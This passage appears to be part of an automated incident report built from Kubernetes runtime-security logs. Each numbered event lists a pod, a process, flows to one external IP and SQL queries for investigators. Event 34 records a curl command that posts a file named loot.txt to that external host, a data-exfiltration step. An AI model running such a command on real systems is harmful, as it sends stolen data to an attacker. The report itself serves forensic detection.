**Artifacts:** `10.244.1.60, 172.30.164.116`

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 09:03:57.552000 - 09:05:55.667000 | **user-api-788c5bb688-5rmhw -> EXTERNAL:172.30.164.116:8888** | 10 | CONFIRMED |
| 09:03:57.553000 - 09:05:55.666000 | **EXTERNAL:172.30.164.116 -> user-api-788c5bb688-5rmhw:43404** | 7 | CONFIRMED |
| 09:03:57.508000 | **EXTERNAL:172.30.164.116 -> web-service-548d6dcdf6-2ztpn:43574** | 1 | CONFIRMED |
| 09:03:57.511000 | **web-service-548d6dcdf6-2ztpn -> EXTERNAL:172.30.164.116:4445** | 1 | CONFIRMED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTkwNDExMDQwNzEwNzI6OTQzOTQy';
-- Network Check (Confirmed)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 09:01:57.513371' AND '2026-01-30 09:05:57.513371' AND (dest_ip IN ('10.244.1.60', '172.30.164.116') OR src_ip IN ('10.244.1.60', '172.30.164.116'));
```

---
## 31. [CORRELATED] 09:04:24.821353
**Pod:** `user-api-788c5bb688-5rmhw`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTkwNjg0MTM0MTEyMTc6OTQzOTcz`

**Command (x1):**
```bash
/usr/bin/ln Exec ID   : azhzLXdvcmtlcjo3MTkwNjg0MTM0MTEyMTc6OTQzOTcz
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 09:04:19.054000 - 09:06:16.536000 | EXTERNAL:172.30.164.116 -> user-api-788c5bb688-5rmhw:43404 | 7 | RELATED |
| 09:04:19.055000 - 09:06:16.537000 | user-api-788c5bb688-5rmhw -> EXTERNAL:172.30.164.116:8888 | 7 | RELATED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTkwNjg0MTM0MTEyMTc6OTQzOTcz';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 09:02:24.821353' AND '2026-01-30 09:06:24.821353' AND (src_pod LIKE '%user%' OR dest_pod LIKE '%user%');
```

---
## 32. [CORRELATED] 09:09:09.619427
**Pod:** `user-api-788c5bb688-5rmhw`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTkzNTMyMDE0NDMzMTg6OTQ0MjUx`

**Command (x1):**
```bash
/usr/bin/hostname Exec ID   : azhzLXdvcmtlcjo3MTkzNTMyMDE0NDMzMTg6OTQ0MjUx
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 09:09:06.982000 - 09:10:54.850000 | EXTERNAL:172.30.164.116 -> user-api-788c5bb688-5rmhw:43404 | 16 | RELATED |
| 09:09:06.983000 - 09:10:54.894000 | user-api-788c5bb688-5rmhw -> EXTERNAL:172.30.164.116:8888 | 16 | RELATED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTkzNTMyMDE0NDMzMTg6OTQ0MjUx';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 09:07:09.619427' AND '2026-01-30 09:11:09.619427' AND (src_pod LIKE '%user%' OR dest_pod LIKE '%user%');
```

---
## 33. [CORRELATED] 09:10:19.277068
**Pod:** `user-api-788c5bb688-5rmhw`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTk0MjI4NjcwMTQxNDg6OTQ0MzMx`

**Command (x1):**
```bash
/usr/bin/hostname Exec ID   : azhzLXdvcmtlcjo3MTk0MjI4NjcwMTQxNDg6OTQ0MzMx
```

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 09:10:14.969000 - 09:11:50.857000 | EXTERNAL:172.30.164.116 -> user-api-788c5bb688-5rmhw:43404 | 14 | RELATED |
| 09:10:15.010000 - 09:11:50.901000 | user-api-788c5bb688-5rmhw -> EXTERNAL:172.30.164.116:8888 | 14 | RELATED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTk0MjI4NjcwMTQxNDg6OTQ0MzMx';
-- Network Check (Pod Context)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 09:08:19.277068' AND '2026-01-30 09:12:19.277068' AND (src_pod LIKE '%user%' OR dest_pod LIKE '%user%');
```

---
## 34. [CONFIRMED] 09:11:20.061808
**Pod:** `user-api-788c5bb688-5rmhw`  |  **Exec ID:** `azhzLXdvcmtlcjo3MTk0ODM2NTg5OTA1OTg6OTQ0Mzkz`

**Command (x1):**
```bash
/usr/bin/curl -X POST --data-binary @/tmp/loot.txt http://172.30.164.116:8080/
```

**Artifacts:** `172.30.164.116`

**Network Activity:**
| Time | Flow | Count | Type |
| :--- | :--- | :--- | :--- |
| 09:11:20.071000 - 09:11:29.492000 | **admin-578bfd98fd-kqzss -> EXTERNAL:172.30.164.116:8080** | 10 | CONFIRMED |
| 09:11:20.059000 - 09:11:50.857000 | **EXTERNAL:172.30.164.116 -> user-api-788c5bb688-5rmhw:43404** | 4 | CONFIRMED |
| 09:11:20.059000 - 09:11:50.901000 | **user-api-788c5bb688-5rmhw -> EXTERNAL:172.30.164.116:8888** | 4 | CONFIRMED |
| 09:11:20.072000 - 09:11:29.484000 | **EXTERNAL:172.30.164.116 -> admin-578bfd98fd-kqzss:39016** | 3 | CONFIRMED |

**Investigation Query:**
```sql
-- Process Detail
SELECT * FROM tetragon WHERE exec_id='azhzLXdvcmtlcjo3MTk0ODM2NTg5OTA1OTg6OTQ0Mzkz';
-- Network Check (Confirmed)
SELECT * FROM network_incidents WHERE time BETWEEN '2026-01-30 09:09:20.061808' AND '2026-01-30 09:13:20.061808' AND (dest_ip IN ('172.30.164.116') OR src_ip IN ('172.30.164.116'));
```

---